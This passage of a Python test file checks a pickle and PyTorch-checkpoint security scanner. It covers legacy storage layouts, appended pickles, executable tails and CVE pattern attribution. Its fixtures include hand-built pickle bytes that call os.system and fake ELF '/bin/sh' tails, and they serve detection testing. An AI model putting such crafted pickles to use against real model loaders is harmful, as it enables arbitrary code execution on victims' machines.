    assert result.success is True
    assert result.metadata["legacy_pytorch_storage_key_count"] == 0
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_storage_end"] == pickle_end
    assert "legacy_pytorch_storage_payload_skipped" not in result.metadata
    failed_check = next(check for check in result.checks if check.rule_code == "S502")
    issue = next(issue for issue in result.issues if issue.rule_code == "S502")
    assert failed_check.status == CheckStatus.FAILED
    assert failed_check.location == f"{path} (pos {pickle_end})"
    assert failed_check.details["offset"] == pickle_end
    assert issue.location == failed_check.location
    assert issue.details["offset"] == pickle_end


def test_non_seekable_legacy_pytorch_stream_omits_only_raw_storage() -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"\x7fELF" + (b"A" * 512))

    result = PickleScanner(config={"max_known_stream_read_bytes": 256}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="legacy-storage.pt",
    )

    assert result.success is False
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_storage_end"] == len(payload)
    assert result.metadata["legacy_pytorch_storage_scan_bounded"] is True
    assert result.metadata["legacy_pytorch_storage_bytes_buffered"] == 256 - pickle_end
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "non_seekable_stream_truncated" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "Pickle Stream Read Limit" for check in result.checks)
    assert not any(check.name == "Legacy PyTorch Storage Layout" for check in result.checks)
    integrity_check = next(check for check in result.checks if check.name == "File Integrity Check")
    assert integrity_check.details["hash_complete"] is False
    assert not any(issue.rule_code == "S502" for issue in result.issues)


def test_non_seekable_legacy_pytorch_stream_keeps_unread_suffix_inconclusive() -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"A" * 512)
    storage_end = len(payload)
    appended_pickle = pickle.dumps(MaliciousPayload(), protocol=4)
    combined_payload = payload + appended_pickle

    result = PickleScanner(config={"max_known_stream_read_bytes": 256}).scan_stream(
        NonSeekableBytesIO(combined_payload),
        len(combined_payload),
        source="legacy-unread-suffix.pt",
    )

    assert result.success is False
    assert result.metadata["legacy_pytorch_storage_end"] == storage_end
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "non_seekable_stream_truncated" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "Pickle Stream Read Limit" for check in result.checks)
    assert not any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_non_seekable_legacy_pytorch_stream_scans_malicious_control_pickle() -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 512,
        malicious_object=True,
    )

    result = PickleScanner(config={"max_known_stream_read_bytes": 256}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="legacy-malicious-storage.pt",
    )

    assert result.success is False
    assert result.metadata["legacy_pytorch_storage_scan_bounded"] is True
    assert "legacy_pytorch_storage_payload_skipped" in result.metadata["scan_outcome_reasons"]
    assert "non_seekable_stream_truncated" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_seekable_legacy_pytorch_stream_preserves_wrapped_positions() -> None:
    prefix = b"WRAPPED:"
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 64,
        malicious_object=True,
    )
    bare_result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="bare.pt")
    wrapped_stream = io.BytesIO(prefix + payload)
    wrapped_stream.seek(len(prefix))

    wrapped_result = PickleScanner().scan_stream(wrapped_stream, len(payload), source="wrapped.pt")

    assert wrapped_result.metadata["first_pickle_end_pos"] == (
        bare_result.metadata["first_pickle_end_pos"] + len(prefix)
    )
    assert wrapped_result.metadata["legacy_pytorch_storage_start"] == (
        bare_result.metadata["legacy_pytorch_storage_start"] + len(prefix)
    )
    assert wrapped_result.metadata["legacy_pytorch_storage_end"] == (
        bare_result.metadata["legacy_pytorch_storage_end"] + len(prefix)
    )
    for bare_boundary, wrapped_boundary in zip(
        bare_result.metadata["legacy_pytorch_pickle_stream_boundaries"],
        wrapped_result.metadata["legacy_pytorch_pickle_stream_boundaries"],
        strict=True,
    ):
        assert wrapped_boundary["start"] == bare_boundary["start"] + len(prefix)
        assert wrapped_boundary["end"] == bare_boundary["end"] + len(prefix)
    assert "known_stream_truncated" not in wrapped_result.metadata.get("scan_outcome_reasons", [])
    bare_reference = next(
        reference
        for reference in bare_result.metadata["import_references"]
        if reference["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    wrapped_reference = next(
        reference
        for reference in wrapped_result.metadata["import_references"]
        if reference["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    assert wrapped_reference["position"] == bare_reference["position"] + len(prefix)
    bare_invocation = next(
        invocation
        for invocation in bare_result.metadata["callable_invocations"]
        if invocation["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    wrapped_invocation = next(
        invocation
        for invocation in wrapped_result.metadata["callable_invocations"]
        if invocation["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    assert wrapped_invocation["global_position"] == bare_invocation["global_position"] + len(prefix)
    assert wrapped_invocation["opcode_position"] == bare_invocation["opcode_position"] + len(prefix)
    wrapped_issue = next(
        issue for issue in wrapped_result.issues if issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL
    )
    assert wrapped_issue.details["global_position"] == wrapped_invocation["global_position"]
    wrapped_check = next(
        check for check in wrapped_result.checks if check.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL
    )
    assert wrapped_check.status == CheckStatus.FAILED
    assert wrapped_check.location == wrapped_issue.location
    assert wrapped_check.details["global_position"] == wrapped_reference["position"]
    assert wrapped_stream.tell() == len(prefix)


def test_seekable_legacy_pytorch_stream_scans_suffix_beyond_storage_window() -> None:
    prefix = b"WRAPPED:"
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 4096)
    storage_end = len(payload)
    appended_pickle = pickle.dumps(MaliciousPayload(), protocol=4)
    global_position = next(
        position
        for opcode, _arg, position in pickletools.genops(appended_pickle)
        if opcode.name in {"GLOBAL", "STACK_GLOBAL"} and position is not None
    )
    wrapped_stream = io.BytesIO(prefix + payload + appended_pickle)
    wrapped_stream.seek(len(prefix))

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": pickle_end}).scan_stream(
        wrapped_stream,
        len(payload) + len(appended_pickle),
        source="wrapped-suffix.pt",
    )

    reference = next(
        reference
        for reference in result.metadata["import_references"]
        if reference["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    assert result.success is True
    assert result.metadata["legacy_pytorch_storage_start"] == len(prefix) + pickle_end
    assert result.metadata["legacy_pytorch_storage_end"] == len(prefix) + storage_end
    assert reference["position"] == len(prefix) + storage_end + global_position
    assert result.metadata["pickle_verdict"] == "malicious"
    assert result.metadata["protocols"] == [2, 4]
    assert wrapped_stream.tell() == len(prefix)


def test_legacy_pytorch_storage_bytes_are_not_counted_as_pickle_cve_streams(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"N\xff" * 65)
    path = tmp_path / "legacy-opcode-shaped-storage.bin"
    path.write_bytes(payload)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": len(payload)}).scan(str(path))

    assert result.success is True
    assert result.metadata["pickle_cve_streams_analyzed"] == 5
    assert not any(check.name == "Pickle CVE Stream Coverage" for check in result.checks)


def test_legacy_pytorch_storage_bytes_do_not_report_extension_opcodes(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"\x82\x01\x83\x01\x00" * 32)
    path = tmp_path / "legacy-extension-shaped-storage.bin"
    path.write_bytes(payload)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": len(payload)}).scan(str(path))

    assert result.success is True
    assert not any(issue.details.get("opcode") in {"EXT1", "EXT2"} for issue in result.issues)


def test_legacy_pytorch_storage_bytes_do_not_trigger_pickle_cve_patterns(tmp_path: Path) -> None:
    storage_payload = b"torch.distributed.rpc rpc_sync eval" + (b"A" * 512)
    payload, _pickle_end = _make_legacy_pytorch_container(storage_payload)
    path = tmp_path / "legacy-cve-shaped-storage.pt"
    path.write_bytes(payload)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": len(payload)}).scan(str(path))

    assert result.success is True
    assert result.metadata["legacy_pytorch_storage_end"] == len(payload)
    assert not any(issue.details.get("cve_id") == "CVE-2024-5480" for issue in result.issues)


def test_legacy_pytorch_container_scans_pickle_after_large_storage(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 4096)
    storage_end = len(payload)
    appended_pickle = pickle.dumps(MaliciousPayload(), protocol=4)
    global_position = next(
        position
        for opcode, _arg, position in pickletools.genops(appended_pickle)
        if opcode.name in {"GLOBAL", "STACK_GLOBAL"} and position is not None
    )
    reduce_position = next(
        position
        for opcode, _arg, position in pickletools.genops(appended_pickle)
        if opcode.name == "REDUCE" and position is not None
    )
    path = tmp_path / "legacy-storage-appended-pickle.pt"
    path.write_bytes(payload + appended_pickle)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": pickle_end + 16}).scan(str(path))

    reference = next(
        reference
        for reference in result.metadata["import_references"]
        if reference["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    invocation = next(
        invocation
        for invocation in result.metadata["callable_invocations"]
        if invocation["import_reference"] == EXPECTED_SYSTEM_GLOBAL
    )
    issue = next(issue for issue in result.issues if issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL)
    assert result.success is True
    assert result.metadata["legacy_pytorch_storage_start"] == pickle_end
    assert result.metadata["legacy_pytorch_storage_end"] == storage_end
    assert (
        result.metadata["first_pickle_end_pos"] == result.metadata["legacy_pytorch_pickle_stream_boundaries"][0]["end"]
    )
    assert result.metadata["protocols"] == [2, 4]
    assert result.metadata["globals_count"] == 2
    assert result.metadata["pickle_verdict"] == "malicious"
    assert result.metadata["pickle_coverage"]["bytes_scanned"] == pickle_end + len(appended_pickle)
    assert reference["position"] == storage_end + global_position
    assert invocation["global_position"] == reference["position"]
    assert invocation["opcode_position"] == storage_end + reduce_position
    assert issue.details["global_position"] == reference["position"]


def test_merge_standalone_pickle_segment_adds_scoped_opcode_counts() -> None:
    scanner = PickleScanner()
    result = ScanResult(scanner_name=scanner.name, scanner=scanner)
    result.metadata.update(
        {
            "opcode_counts": {"PROTO": 1},
            "nested_opcode_counts": {"NEWOBJ": 1},
            "follow_on_opcode_counts": {"REDUCE": 1},
        }
    )
    segment_result = ScanResult(scanner_name=scanner.name, scanner=scanner)
    segment_result.metadata.update(
        {
            "opcode_counts": {"STOP": 1},
            "nested_opcode_counts": {"NEWOBJ": 2},
            "follow_on_opcode_counts": {"REDUCE": 2},
        }
    )

    scanner._merge_standalone_pickle_segment(result, segment_result, segment_start=10)

    assert result.metadata["opcode_counts"] == {"PROTO": 1, "STOP": 1}
    assert result.metadata["nested_opcode_counts"] == {"NEWOBJ": 3}
    assert result.metadata["follow_on_opcode_counts"] == {"REDUCE": 3}
    assert result.metadata["opcode_count"] == 2


def test_legacy_pytorch_complete_suffix_pickles_are_not_retreated_as_binary_tail(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(b"A")
    storage_end = len(payload)
    appended_pickle = pickle.dumps({"safe": True}, protocol=4) + pickle.dumps(
        {"blob": b"B" * (_BINARY_TAIL_SCAN_BYTES + 100)},
        protocol=4,
    )
    path = tmp_path / "legacy-benign-large-suffix.pt"
    path.write_bytes(payload + appended_pickle)

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["legacy_pytorch_storage_end"] == storage_end
    assert result.metadata["last_pickle_end_pos"] == len(payload) + len(appended_pickle)
    assert "pickle_binary_tail_scan_window_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "Pickle Binary Tail Coverage" for check in result.checks)


def test_legacy_pytorch_container_scans_malicious_object_stream(tmp_path: Path) -> None:
    payload, _pickle_end = _make_legacy_pytorch_container(
        b"A" * 64,
        malicious_object=True,
    )
    path = tmp_path / "legacy-malicious-object.bin"
    path.write_bytes(payload)

    result = PickleScanner().scan(str(path))

    assert result.success is True
    assert result.metadata["legacy_pytorch_container"] is True
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(issue.details.get("import_reference") == EXPECTED_SYSTEM_GLOBAL for issue in result.issues)


def test_truncated_legacy_pytorch_control_stream_remains_inconclusive(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    truncated_payload = payload[: pickle_end - 1] + payload[pickle_end:]
    path = tmp_path / "legacy-truncated-control.bin"
    path.write_bytes(truncated_payload)

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata.get("legacy_pytorch_container") is not True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pickle_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not _trusted_legacy_storage_pid_checks(result)
    assert "legacy_pytorch_storage_payload_skipped" not in result.metadata


def test_legacy_pytorch_invalid_storage_header_fails_closed(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"\x7fELF" + (b"A" * 64))
    malformed_payload = payload[:pickle_end] + (1).to_bytes(8, "little") + payload[pickle_end + 8 :]
    path = tmp_path / "legacy-invalid-storage-header.pt"
    path.write_bytes(malformed_payload)

    result = PickleScanner().scan(str(path))
    result.metadata["file_path"] = str(path)
    aggregate_result = create_initial_audit_result()
    merge_scan_result(aggregate_result, result)

    assert result.success is False
    assert result.metadata.get("legacy_pytorch_container") is not True
    assert result.metadata["legacy_pytorch_control_streams"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not _trusted_legacy_storage_pid_checks(result)
    assert any(
        check.name == "Legacy PyTorch Storage Layout"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S902"
        for check in result.checks
    )
    assert not any(issue.rule_code == "S502" for issue in result.issues)
    assert determine_exit_code(aggregate_result) == 1


def test_scan_bin_file_detects_executable_tail_after_pickle_stream(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(issue.rule_code == "S502" for issue in result.issues)


def test_scan_pytorch_extension_detects_executable_tail_after_pickle_stream(tmp_path: Path) -> None:
    path = tmp_path / "model.pt"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(issue.rule_code == "S502" for issue in result.issues)


def test_scan_pytorch_extension_marks_out_of_window_binary_tail_incomplete(tmp_path: Path) -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    path = tmp_path / "model.pt"
    path.write_bytes(pickle_payload + (b"A" * (_BINARY_TAIL_SCAN_BYTES + 8)) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pickle_binary_tail_scan_window_exceeded" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.rule_code == "S502" for issue in result.issues)
    checks = [check for check in result.checks if check.name == "Pickle Binary Tail Coverage"]
    assert len(checks) == 1
    assert checks[0].status == CheckStatus.FAILED
    assert checks[0].details["tail_bytes_scanned"] == _BINARY_TAIL_SCAN_BYTES
    assert checks[0].details["tail_bytes_total"] > _BINARY_TAIL_SCAN_BYTES


def test_scan_pytorch_extension_keeps_security_exit_for_detected_binary_tail_gap(tmp_path: Path) -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    path = tmp_path / "model.pt"
    path.write_bytes(pickle_payload + b"\x7fELF/bin/sh\x00" + (b"A" * (_BINARY_TAIL_SCAN_BYTES + 8)))

    result = PickleScanner().scan(str(path))
    result.metadata["file_path"] = str(path)
    aggregate_result = create_initial_audit_result()
    merge_scan_result(aggregate_result, result)

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pickle_binary_tail_scan_window_exceeded" in result.metadata["scan_outcome_reasons"]
    assert result.metadata.get("operational_error") is not True
    assert any(issue.rule_code == "S502" for issue in result.issues)
    assert determine_exit_code(aggregate_result) == 1


def test_legacy_pytorch_control_probe_is_independent_of_raw_detector_limit(tmp_path: Path) -> None:
    payload, pickle_end = _make_legacy_pytorch_container(b"A" * 64)
    path = tmp_path / "legacy-missing-storage.pt"
    path.write_bytes(payload[:pickle_end])

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 128}).scan(str(path))

    assert result.success is False
    assert result.metadata["legacy_pytorch_control_streams"] is True
    assert "legacy_pytorch_storage_layout_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "Legacy PyTorch Storage Layout" for check in result.checks)


def test_scan_stream_unknown_size_seekable_marks_out_of_window_binary_tail_incomplete() -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    filler = b"".join(pickle.dumps({"pad": b"A" * 65536}, protocol=4) for _ in range(17))
    stream = io.BytesIO(pickle_payload + filler)

    result = PickleScanner().scan_stream(stream, None, source="unknown-tail.pt")

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pickle_binary_tail_scan_window_exceeded" in result.metadata["scan_outcome_reasons"]
    checks = [check for check in result.checks if check.name == "Pickle Binary Tail Coverage"]
    assert len(checks) == 1
    assert checks[0].status == CheckStatus.FAILED
    assert checks[0].details["tail_bytes_scanned"] == _BINARY_TAIL_SCAN_BYTES
    assert checks[0].details["tail_bytes_total"] is None
    assert stream.tell() == 0


def test_scan_stream_unknown_size_seekable_allows_exact_binary_tail_window() -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    filler = pickle.dumps(b"A" * (_BINARY_TAIL_SCAN_BYTES - 9), protocol=4)
    assert len(filler) == _BINARY_TAIL_SCAN_BYTES
    stream = io.BytesIO(pickle_payload + filler)

    result = PickleScanner().scan_stream(stream, None, source="exact-tail.pt")

    assert result.success is True
    assert not any(check.name == "Pickle Binary Tail Coverage" for check in result.checks)
    assert stream.tell() == 0


def test_scan_file_allows_exact_binary_tail_window(tmp_path: Path) -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    path = tmp_path / "exact-tail.pt"
    path.write_bytes(pickle_payload + (b"A" * _BINARY_TAIL_SCAN_BYTES))

    result = PickleScanner().scan(str(path))

    assert "pickle_binary_tail_scan_window_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "Pickle Binary Tail Coverage" for check in result.checks)


def test_scan_stream_unknown_size_tail_timeout_is_inconclusive(monkeypatch: pytest.MonkeyPatch) -> None:
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    stream = io.BytesIO(pickle_payload + (b"A" * (_BINARY_TAIL_SCAN_BYTES + 1)))
    scanner = PickleScanner()
    result = ScanResult(scanner_name=scanner.name, scanner=scanner)
    result.metadata["first_pickle_end_pos"] = len(pickle_payload)
    monkeypatch.setattr(scanner, "_check_timeout", lambda allow_partial=False: True)

    scanner._scan_seekable_stream_binary_tail_if_needed(stream, 0, None, result, "timeout-tail.pt")

    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["pickle_binary_tail_scan_timeout"]
    checks = [check for check in result.checks if check.name == "Pickle Binary Tail Coverage"]
    assert len(checks) == 1
    assert checks[0].status == CheckStatus.FAILED
    assert checks[0].details["tail_bytes_scanned"] == 0
    assert checks[0].details["tail_bytes_total"] is None
    assert checks[0].details["timed_out"] is True
    assert stream.tell() == 0


def test_scan_file_detects_executable_tail_past_raw_scan_window(tmp_path: Path) -> None:
    pickle_payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)
    path = tmp_path / "large-tail.bin"
    path.write_bytes(pickle_payload + b"\x7fELF/bin/sh\x00")

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan(str(path))

    assert any(
        issue.rule_code == "S502" and issue.details.get("offset") == len(pickle_payload) for issue in result.issues
    )


def test_scan_file_detects_executable_tail_after_malformed_pickle_prefix(tmp_path: Path) -> None:
    path = tmp_path / "malformed-tail.bin"
    path.write_bytes(b"\x80\x04}JUNK\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert any(issue.rule_code == "S502" and issue.details.get("offset") == 7 for issue in result.issues)


def test_scan_bin_file_pe_tail_requires_pe_evidence(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"MZ benign initials")

    result = PickleScanner().scan(str(path))

    assert not any(issue.rule_code == "S501" for issue in result.issues)


def test_scan_bin_file_detects_pe_tail_with_dos_stub(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(
        pickle.dumps({"safe": True}, protocol=4) + b"MZ" + (b"\x00" * 30) + b"This program cannot be run in DOS mode"
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.rule_code == "S501" for issue in result.issues)


def test_raw_cve_setitem_detection_ignores_unparsed_tail_strings(tmp_path: Path) -> None:
    path = tmp_path / "tail.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"os.system")

    result = PickleScanner().scan(str(path))

    assert all(
        not (issue.details.get("cve_id") == "CVE-2026-24747" and issue.rule_code in {"S209", "S310"})
        for issue in result.issues
    )


def test_raw_cve_setitem_detection_is_not_suppressed_by_comment_token(tmp_path: Path) -> None:
    path = tmp_path / "comment-token-setitem.pkl"
    path.write_bytes(b"\x80\x02S'_rebuild_tensor # comment token is not a bypass'\n)\x81S'key'\nS'value'\ns.")

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert any(issue.rule_code == "S209" for issue in result.issues)


def test_raw_cve_attributions_are_deduplicated_by_rule(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit.detectors import cve_patterns

    def duplicate_analyze_cve_patterns(_content: str, _binary_content: bytes = b"") -> list[Any]:
        return [
            cve_patterns.CVEAttribution(
                cve_id="CVE-2026-24747",
                description="PyTorch weights_only restricted unpickler SETITEM abuse pattern",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-502",
                affected_versions="PyTorch versions before the fixed release",
                remediation="Upgrade PyTorch and avoid loading untrusted pickle checkpoints",
                patterns_matched=["_rebuild_tensor", "SETITEM opcode"],
            ),
            cve_patterns.CVEAttribution(
                cve_id="CVE-2026-24747",
                description="Duplicate SETITEM attribution",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-502",
                affected_versions="PyTorch versions before the fixed release",
                remediation="Upgrade PyTorch and avoid loading untrusted pickle checkpoints",
                patterns_matched=["_rebuild_tensor", "SETITEM opcode"],
            ),
        ]

    monkeypatch.setattr(cve_patterns, "analyze_cve_patterns", duplicate_analyze_cve_patterns)
    path = tmp_path / "duplicate-setitem-attribution.pkl"
    path.write_bytes(b"\x80\x02S'_rebuild_tensor # comment token is not a bypass'\n)\x81S'key'\nS'value'\ns.")

    result = PickleScanner().scan(str(path))

    cve_issues = [
        issue
        for issue in result.issues
        if issue.rule_code == "S209" and issue.details.get("cve_id") == "CVE-2026-24747"
    ]
    assert len(cve_issues) == 1
    assert result.metadata["cve_count"] == 1
    assert len(result.metadata["cve_attributions"]) == 1


def test_analyze_cve_patterns_deduplicates_attributions() -> None:
    from modelaudit.detectors import cve_patterns

    attributions = cve_patterns.analyze_cve_patterns(
        "_rebuild_tensor SETITEM _rebuild_tensor SETITEM",
    )
    cve_ids = [attribution.cve_id for attribution in attributions]

    assert cve_ids.count("CVE-2026-24747") == 1
    assert len(cve_ids) == len(set(cve_ids))


def test_raw_cve_comment_only_text_does_not_trigger_setitem(tmp_path: Path) -> None:
    path = tmp_path / "comment-only.pkl"
    path.write_bytes(
        pickle.dumps({"doc": "# _rebuild_tensor SETITEM storage_offset nbytes\n# documentation only"}, protocol=4)
    )

    result = PickleScanner().scan(str(path))

    assert not any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)


def test_raw_cve_rebuild_tensor_global_is_not_suppressed_by_documentation_literal(tmp_path: Path) -> None:
    path = tmp_path / "doc-literal-real-global.pkl"
    path.write_bytes(
        b"\x80\x02S'# _rebuild_tensor\\n# documentation only'\n0ctorch\n_rebuild_tensor_v2\n)RS'key'\nS'value'\ns."
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert result.metadata["primary_cve"] == "CVE-2026-24747"


def test_rebuild_tensor_documentation_literal_detector_behavior() -> None:
    doc_only_payload = pickle.dumps({"doc": "# _rebuild_tensor\n# documentation only"}, protocol=4)
    real_global_payload = (
        b"\x80\x02S'# _rebuild_tensor\\n# documentation only'\n0ctorch\n_rebuild_tensor_v2\n)RS'key'\nS'value'\ns."
    )

    assert _rebuild_tensor_indicators_are_documentation_literals(doc_only_payload) is True
    assert _rebuild_tensor_indicators_are_documentation_literals(real_global_payload) is False


def test_raw_cve_rebuild_tensor_doc_filter_uses_rust_import_metadata(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr(
        "modelaudit.scanners.pickle_scanner._rebuild_tensor_indicators_are_documentation_literals",
        lambda _data: True,
    )
    path = tmp_path / "rust-rebuild-tensor-global.pkl"
    path.write_bytes(
        b"\x80\x02S'# _rebuild_tensor\\n# documentation only'\n0ctorch\n_rebuild_tensor_v2\n)RS'key'\nS'value'\ns."
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert any(
        reference.get("import_reference") == "torch._rebuild_tensor_v2"
        for reference in result.metadata["import_references"]
    )


def test_opcode_summary_tracks_memoized_stack_global_in_dict_without_setitem_cve(tmp_path: Path) -> None:
    payload = b"\x80\x04\x8c\x02os\x94}\x94\x8c\x06system\x94h\x00h\x02\x93s."
    path = tmp_path / "memoized-stack-global.pkl"
    path.write_bytes(payload)

    summary = _pickle_opcode_summary(payload)
    result = PickleScanner().scan(str(path))

    assert summary["dangerous_globals"] == ["os.system"]
    assert not any(issue.rule_code == "S209" for issue in result.issues)


def test_raw_cve_setitem_scan_uses_rust_metadata_not_python_opcode_summary(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    def fail_opcode_summary(_payload: bytes) -> dict[str, Any]:
        raise AssertionError("scan path should use Rust opcode metadata")

    monkeypatch.setattr("modelaudit.scanners.pickle_scanner._pickle_opcode_summary", fail_opcode_summary)
    path = tmp_path / "rust-metadata-stack-global.pkl"
    path.write_bytes(b"\x80\x04\x8c\x02os\x8c\x06system\x93)R\x8c\x03key\x8c\x05values.")

    result = PickleScanner().scan(str(path))

    assert any(
        issue.rule_code == "S209" and issue.details.get("associated_global") == "os.system" for issue in result.issues
    )


def test_opcode_summary_uses_cpython_memoize_indexing_after_explicit_put() -> None:
    payload = b"\x80\x04\x8c\x02osq\x05\x8c\x06system\x94h\x05h\x01\x93."

    summary = _pickle_opcode_summary(payload)

    assert summary["dangerous_globals"] == ["os.system"]


def test_scan_stream_enforces_size_limit() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner(config={"max_file_read_size": 4}).scan_stream(
        io.BytesIO(payload),
        len(payload),
        source="too-large.pkl",
    )

    assert result.success is False
    assert any(check.name == "File Size Limit" for check in result.checks)


def test_direct_scan_delegates_zip_backed_pytorch_container(tmp_path: Path) -> None:
    path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    result = PickleScanner().scan(str(path))

    assert result.scanner_name == "pytorch_zip"
    assert any(issue.details.get("pickle_filename") == "data.pkl" for issue in result.issues)


def test_pickle_scanner_delegates_jax_specific_patterns_for_jax_pickles(tmp_path: Path) -> None:
    path = tmp_path / "jax_state.pickle"
    path.write_bytes(
        pickle.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback",
            }
        )
    )

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_delegates_jax_patterns_for_pkl_suffixes(tmp_path: Path) -> None:
    path = tmp_path / "jax_state.pkl"
    path.write_bytes(pickle.dumps({"payload": "jax.experimental.io_callback"}))

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_skips_jax_delegation_for_complete_non_jax_payloads(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "plain_state.pkl"
    payload = pickle.dumps({"payload": "ordinary pickle state"})
    path.write_bytes(payload)

    scanner = PickleScanner()
    result = scanner._create_result()

    def fail_if_called(path: str, text: str) -> ScanResult:
        raise AssertionError("JAX checkpoint delegation should be skipped")

    monkeypatch.setattr(
